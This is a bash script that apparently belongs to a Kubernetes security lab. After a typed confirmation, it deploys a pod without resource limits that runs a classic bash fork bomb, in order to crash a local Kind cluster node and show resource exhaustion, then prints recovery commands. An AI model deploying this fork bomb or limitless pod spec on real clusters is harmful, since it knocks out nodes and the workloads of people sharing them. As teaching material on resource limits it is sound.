#!/bin/bash

echo "=== Kubernetes Cluster Crash Demonstration ==="
echo ""
echo "⚠️  This will crash the LOCAL Kind cluster"
echo "    Demonstrates fork bomb and resource exhaustion"
echo ""

read -p "Continue? (type 'crash' to confirm): " confirm

if [ "$confirm" != "crash" ]; then
    echo "Cancelled"
    exit 0
fi

# Fork bomb pod
echo ""
echo "Deploying fork bomb (no resource limits)..."

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: fork-bomb
  namespace: vulnerable-apps
spec:
  containers:
  - name: bomb
    image: ubuntu:latest
    command:
    - /bin/bash
    - -c
    - |
      # Fork bomb - will crash the node
      :(){ :|:& };:
    # NO RESOURCE LIMITS! (vulnerability)
EOF

echo ""
echo "⚠️  Fork bomb started!"
echo ""
echo "Watch what happens:"
echo "  kubectl get pods -n vulnerable-apps -w"
echo ""
echo "Node will become NotReady in ~30 seconds"
echo ""
echo "To recover:"
echo "  kubectl delete pod fork-bomb -n vulnerable-apps --force --grace-period=0"
echo "  kind delete cluster --name vuln-cluster"
echo "  kind create cluster --config local-k8s/kind-config-vulnerable.yaml"